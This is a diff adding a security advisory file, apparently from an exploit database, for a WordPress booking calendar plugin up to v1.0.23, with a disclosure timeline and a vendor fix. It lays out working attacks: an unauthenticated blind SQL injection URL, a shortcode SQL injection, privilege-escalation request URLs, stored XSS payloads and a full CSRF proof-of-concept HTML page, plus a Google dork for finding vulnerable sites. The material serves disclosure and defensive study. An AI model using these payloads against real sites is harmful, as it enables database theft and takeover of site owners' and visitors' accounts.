@@ -1,0 +1,260 @@
+# Exploit Title: Wordpress booking calendar contact form <=v1.0.23 - Unauthenticated blind SQL injection
+# Date: 2016-02-08
+# Google Dork: Index of /wp-content/plugins/booking-calendar-contact-form
+# Exploit Author: Joaquin Ramirez Martinez [ i0 SEC-LABORATORY ]
+# Vendor Homepage: http://wordpress.dwbooster.com/
+# Plugin URI: http://wordpress.dwbooster.com/calendars/booking-calendar-contact-form
+# Version: 1.0.23
+# Tested on: windows 10 + firefox. 
+
+==============
+ Description
+==============
+
+Create a booking form with a reservation calendar or a classic contact form, connected to 
+a PayPal payment button.
+With the **Booking Calendar Contact Form** you can create a **classic contact form** or a 
+**booking form with a reservation calendar**, connected to a PayPal payment button. The reservation 
+calendar lets the customer select the start (ex: check-in) and end (ex: checkout) dates.
+
+The **reservation calendar** is an optional item, so it can be disabled to create a **general 
+purpose contact form**.
+
+There are two types of bookings available in the calendar configuration: full day bookings or 
+partial day bookings. With full day bookings the whole day is blocked / reserved while in partial 
+day bookings the start and end dates are partially blocked as used for example in 
+**room/hotel bookings**.
+
+===================
+ Technical details 
+===================
+
+Booking calendar plugin  is prone to a blind sql injection because fails to sanitize a 
+parameter used into a sql statement. 
+The function ´dex_bccf_get_option´ uses a variable called ´CP_BCCF_CALENDAR_ID´ which is not sanitized
+and is used as value for the ´id´ of sql parameter.
+The vulnerable function is called into many other functions, and one of those is ´dex_bccf_calendar_load2´ 
+which sets the ´CP_BCCF_CALENDAR_ID´ with the following code:
+
+""
+$calid = str_replace(TDE_BCCFCAL_PREFIX, "", @$_GET["id"]);
+    if (!defined('CP_BCCF_CALENDAR_ID') && $calid != '-1')
+        define('CP_BCCF_CALENDAR_ID', $calid);
+""
+
+and then the function ´dex_bccf_get_option´ is called into ´dex_bccf_calendar_load2´ function:
+
+"" ...
+$option = dex_bccf_get_option('calendar_overlapped', DEX_BCCF_DEFAULT_CALENDAR_OVERLAPPED);
+   ...
+""
+
+The ´dex_bccf_calendar_load2´ function is called when we request the next url:
+
+http://<wp-host>/<wp-path>/wp-admin/admin-ajax.php?action=dex_bccf_calendar_ajaxevent
+&dex_bccf_calendar_load2=list&id=<SQLI commands>
+
+A malicious unauthenticated user can exploit the sql injection and obtain all records from database.
+
+==================
+ Proof of concept
+==================
+
+http://localhost/wordpress/wp-admin/admin-ajax.php?action=dex_bccf_calendar_ajaxevent
+&dex_bccf_calendar_load2=list&id=1%20and%20sleep(10)
+
+###############################################################################
+
+# Exploit Title: Wordpress booking calendar contact form <=v1.0.23 - Unauthenticated blind SQL injection
+# Date: 2016-02-08
+# Google Dork: Index of /wp-content/plugins/booking-calendar-contact-form
+# Exploit Author: Joaquin Ramirez Martinez [ i0 SEC-LABORATORY ]
+# Vendor Homepage: http://wordpress.dwbooster.com/
+# Plugin URI: http://wordpress.dwbooster.com/calendars/booking-calendar-contact-form
+# Version: 1.0.23
+# Tested on: windows 10 + firefox.
+
+==============
+ Description
+==============
+
+Create a booking form with a reservation calendar or a classic contact form, connected to
+a PayPal payment button.
+With the **Booking Calendar Contact Form** you can create a **classic contact form** or a
+**booking form with a reservation calendar**, connected to a PayPal payment button. The reservation
+calendar lets the customer select the start (ex: check-in) and end (ex: checkout) dates.
+
+The **reservation calendar** is an optional item, so it can be disabled to create a **general
+purpose contact form**.
+
+There are two types of bookings available in the calendar configuration: full day bookings or
+partial day bookings. With full day bookings the whole day is blocked / reserved while in partial
+day bookings the start and end dates are partially blocked as used for example in
+**room/hotel bookings**.
+
+===================
+ Technical details
+===================
+
+Booking calendar plugin  is prone to a blind sql injection in the shortcode function ´dex_bccf_filter_content´
+because there is not sanitization when the variable ´DEX_BCCF_CALENDAR_FIXED_ID´ is asigned and then is used
+into function ´dex_bccf_get_public_form()´.
+
+function dex_bccf_filter_content($atts) {
+...
+    extract(shortcode_atts(array(
+        'calendar' => '',
+        'user' => '',
+                    ), $atts));
+    if ($calendar != '')
+        define('DEX_BCCF_CALENDAR_FIXED_ID', $calendar);
+    ..
+
+    return $buffered_contents;
+}
+
+
+function dex_bccf_get_public_form() {
+    global $wpdb;
+
+    if (defined('DEX_CALENDAR_USER') && DEX_CALENDAR_USER != 0)
+        $myrows = $wpdb->get_results("SELECT * FROM " . DEX_BCCF_CONFIG_TABLE_NAME . " WHERE conwer=" . DEX_CALENDAR_USER);
+    else if (defined('DEX_BCCF_CALENDAR_FIXED_ID'))
+        $myrows = $wpdb->get_results("SELECT * FROM " . DEX_BCCF_CONFIG_TABLE_NAME . " WHERE id=" . DEX_BCCF_CALENDAR_FIXED_ID);
+    else
+        $myrows = $wpdb->get_results("SELECT * FROM " . DEX_BCCF_CONFIG_TABLE_NAME);
+ ...
+ }
+
+
+==================
+ Proof of concept
+==================
+
+An editor/author can add a ahortcode with his sql command into a post:
+
+
+[CP_BCCF_FORM calendar=-1 or sleep(10)#]
+
+###############################################################################
+
+# Exploit Title: Wordpress booking calendar contact form <=v1.0.23 - Privilege escalation / stored XSS vulnerabilities
+# Date: 2016-02-08
+# Google Dork: Index of /wp-content/plugins/booking-calendar-contact-form
+# Exploit Author: Joaquin Ramirez Martinez [ i0 SEC-LABORATORY ]
+# Vendor Homepage: http://wordpress.dwbooster.com/
+# Plugin URI: http://wordpress.dwbooster.com/calendars/booking-calendar-contact-form
+# Version: 1.0.23
+# Tested on: windows 10 + firefox.
+
+==============
+ Description
+==============
+
+Create a booking form with a reservation calendar or a classic contact form, connected to
+a PayPal payment button.
+With the **Booking Calendar Contact Form** you can create a **classic contact form** or a
+**booking form with a reservation calendar**, connected to a PayPal payment button. The reservation
+calendar lets the customer select the start (ex: check-in) and end (ex: checkout) dates.
+
+The **reservation calendar** is an optional item, so it can be disabled to create a **general
+purpose contact form**.
+
+There are two types of bookings available in the calendar configuration: full day bookings or
+partial day bookings. With full day bookings the whole day is blocked / reserved while in partial
+day bookings the start and end dates are partially blocked as used for example in
+**room/hotel bookings**.
+
+===================
+ Technical details
+===================
+
+Booking calendar contact form plugin for wordpress is prone to multiple privilege escalation and stored XSS
+vulnerabilities because does not verify if a user that make a request for update the plugin options,
+add or delete a ´season price´ and add/delete/update an item to booking list is a privileged user and does not
+sanitize the supplied information.
+
+An authenticated user can exploit these vulnerabilities.
+
+==================
+ Proof of concept
+==================
+
+1) Add a ´season price´ with XSS Payload in parameter ´price´.
+
+http://<wp-path>/<ap-path>/wp-admin/admin-ajax.php?action=dex_bccf_check_posted_data&dex_bccf=loadseasonprices
+&add=1&dex_item=1&price=%3E%22%3Cimg%20src=x%20onerror=alert(/u_r_owned/)%3E%22%3C&dfrom=&dto
+
+2) Delete a ´season price´ with specified ´code´
+
+http://<wp-host>/<wp-path>/wp-admin/admin-ajax.php?action=dex_bccf_check_posted_data
+&dex_bccf=loadseasonprices&delete=1&code=1
+
+
+3) Own a calendars if you have an account like ´suscriptor´ role and inject a XSS payload into ´name parameter´:
+http://<wp-hots>/<wp-path>/wp-admin/admin.php?page=dex_bccf.php&u=<my user id>&public=1&owner=1&name=<XSS payload>
+
+
+4) Update charset of booking calendar tables:
+http://<wp-host>/<wp-path>/wp-admin/admin.php?page=dex_bccf.php&ac=st&chs=<my supplied charset>
+
+
+5) Delete a booking calendar item if you are logged in as suscriptor:
+http://localhost/wordpress/wp-admin/admin.php?page=dex_bccf.php&cal=1&list=1&ld=<id of calendar to delete>
+
+
+6)  Unrestricted update options / stored XSS in some parameters ( PoC html )
+
+
+<html>
+  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin
+
+email_confirmation_to_user,calendar_language,calendar_mode,calendar_pages,currency,cv_text_enter_valid_captcha
+ and other parameters are vulnerables to stored XSS
+
+url_ok,url_cancel can be used to redirect a user and make fishing attacks
+´dex_item´  value is the ´id´ of the calendar.
+   -->
+<body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost:80/wordpress/wp-admin/admin.php?page=dex_bccf.php&cal=1&r=0.5076911114737157", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.setRequestHeader("Accept-Language", "es-MX,es-ES;q=0.9,es;q=0.7,es-AR;q=0.6,es-CL;q=0.4,en-US;q=0.3,en;q=0.1");
+        xhr.withCredentials = true;
+        var body = "dex_bccf_post_options=1&dex_item=1&calendar_enabled=true&selDay_startcal1=&selMonth_startcal1=&selYear_startcal1=&selDay_endcal1=&selMonth_endcal1=&selYear_endcal1=\">\"<img><\"&calendar_pages=2&calendar_language=\">\"<img><\"&calendar_weekday=0&calendar_dateformat=0&calendar_overlapped=false&calendar_showcost=1&calendar_mode=\">\"<img><\"&calendar_mindate=today&calendar_maxdate=\">\"<img><\"&calendar_minnights=%22%3E%22%3Cimg%3E%3C%22&calendar_maxnights=%22%3E%22%3Cimg%3E%3C%22&wd1=1&wd2=1&wd3=1&wd4=1&wd5=1&wd6=1&wd7=1&sd1=1&sd2=1&sd3=1&sd4=1&sd5=1&sd6=1&sd7=1&calendar_fixedreslength=1&calendar_holidays=&calendar_startres=&currency=%22%3E%22%3Cimg%3E%3C%22&request_cost=%22%3E%22%3Cimg%3E%3C%22&max_slots=0&calendar_suplementminnight=%22%3E%22%3Cimg%3E%3C%22&calendar_suplementmaxnight=%22%3E%22%3Cimg%3E%3C%22&calendar_suplement=%22%3E%22%3Cimg%3E%3C%22&calendar_depositenable=0&calendar_depositamount=0&calendar_deposittype=0&dex_dc_price=%22%3E%22%3Cimg%3E%3C%22&dex_dc_season_dfrom=%22%3E%22%3Cimg%3E%3C%22&dex_dc_season_dto=%22%3E%22%3Cimg%3E%3C%22&paypal_email=%22%3E%22%3Cimg%3E%3C%22%40email_here.com&paypal_product_name=%22%3E%22%3Cimg%3E%3C%22&url_ok=http%3A%2F%2Flocalhost%2Fwordpress&url_cancel=http%3A%2F%2Flocalhost%2Fwordpress&paypal_language=%22%3E%22%3Cimg%3E%3C%22&request_taxes=%22%3E%22%3Cimg%3E%3C%22&form_structure=%5B%5B%7B%22name%22%3A%22email%22%2C%22index%22%3A0%2C%22title%22%3A%22Email%22%2C%22ftype%22%3A%22femail%22%2C%22userhelp%22%3A%22%22%2C%22csslayout%22%3A%22%22%2C%22required%22%3Atrue%2C%22predefined%22%3A%22%22%2C%22size%22%3A%22medium%22%7D%2C%7B%22name%22%3A%22subject%22%2C%22index%22%3A1%2C%22title%22%3A%22Subject%22%2C%22required%22%3Atrue%2C%22ftype%22%3A%22ftext%22%2C%22userhelp%22%3A%22%22%2C%22csslayout%22%3A%22%22%2C%22predefined%22%3A%22%22%2C%22size%22%3A%22medium%22%7D%2C%7B%22name%22%3A%22message%22%2C%22index%22%3A2%2C%22size%22%3A%22large%22%2C%22required%22%3Atrue%2C%22title%22%3A%22Message%22%2C%22ftype%22%3A%22ftextarea%22%2C%22userhelp%22%3A%22%22%2C%22csslayout%22%3A%22%22%2C%22predefined%22%3A%22%22%7D%5D%2C%5B%7B%22title%22%3A%22%22%2C%22description%22%3A%22%22%2C%22formlayout%22%3A%22top_aligned%22%7D%5D%5D&sTitle=Email&sShortlabel=&sNametag=%3C%25email%25%3E&sName=email&sSize=medium&sRequired=on&sEqualTo=&sPredefined=&sUserhelp=&sCsslayout=&vs_text_submitbtn=%22%3E%22%3Cimg%3E%3C%22&vs_text_previousbtn=%22%3E%22%3Cimg%3E%3C%22&vs_text_nextbtn=%22%3E%22%3Cimg%3E%3C%22&vs_use_validation=DEX_BCCF_DEFAULT_vs_use_validation&vs_text_is_required=This+field+is+required.&vs_text_is_email=%22%3E%22%3Cimg%3E%3C%22%40mail.com&cv_text_enter_valid_captcha=Please+enter+a+valid+captcha+code.&vs_text_datemmddyyyy=%22%3E%22%3Cimg%3E%3C%22&vs_text_dateddmmyyyy=%22%3E%22%3Cimg%3E%3C%22&vs_text_number=%22%3E%22%3Cimg%3E%3C%22&vs_text_digits=%22%3E%22%3Cimg%3E%3C%22&vs_text_max=%22%3E%22%3Cimg%3E%3C%22&vs_text_min=%22%3E%22%3Cimg%3E%3C%22&cp_cal_checkboxes_type1=0&cp_cal_checkboxes1=&notification_from_email=%22%3E%22%3Cimg%3E%3C%22%40email_here.com&notification_destination_email=%22%3E%22%3Cimg%3E%3C%22%40email_here.com&email_subject_notification_to_admin=%22%3E%22%3Cimg%3E%3C%22&email_notification_to_admin=New+reservation+made+with+the+following+information%3A%0D%0A%0D%0A%22%3E%22%3Cimg%3E%3C%22%0D%0A%0D%0ABest+regards.&cu_user_email_field=email&email_subject_confirmation_to_user=%22%3E%22%3Cimg%3E%3C%22&email_confirmation_to_user=We+have+received+your+request+with+the+following+information%3A%0D%0A%0D%0A%25INFORMATION%25%0D%0A%0D%0A%22%3E%22%3Cimg%3E%3C%22%0D%0A%0D%0ABest+regards.&dexcv_enable_captcha=true&dexcv_width=%22%3E%22%3Cimg%3E%3C%22&dexcv_height=%22%3E%22%3Cimg%3E%3C%22&dexcv_chars=%22%3E%22%3Cimg%3E%3C%22&dexcv_min_font_size=%22%3E%22%3Cimg%3E%3C%22&dexcv_max_font_size=%22%3E%22%3Cimg%3E%3C%22&dexcv_noise=%22%3E%22%3Cimg%3E%3C%22&dexcv_noise_length=%22%3E%22%3Cimg%3E%3C%22&dexcv_background=%22%3E%22%3Cimg%3E%3C%22&dexcv_border=%22%3E%22%3Cimg%3E%3C%22&dexcv_font=font-1.ttf&submit=Save+Changes";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i);
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
+
+
+==========
+ CREDITS
+==========
+
+Vulnerability discovered by:
+	Joaquin Ramirez Martinez [i0 security-lab]
+	joaquin.ramirez.mtz.lab[at]gmail[dot]com
+	https://www.facebook.com/I0-security-lab-524954460988147/
+	https://www.youtube.com/channel/UCe1Ex2Y0wD71I_cet-Wsu7Q
+
+
+========
+TIMELINE
+========
+
+2016-02-01 vulnerability discovered
+2016-02-05 reported to vendor
+2016-02-08 released fixed plugin v1.0.24
+2016-02-08 public disclosure
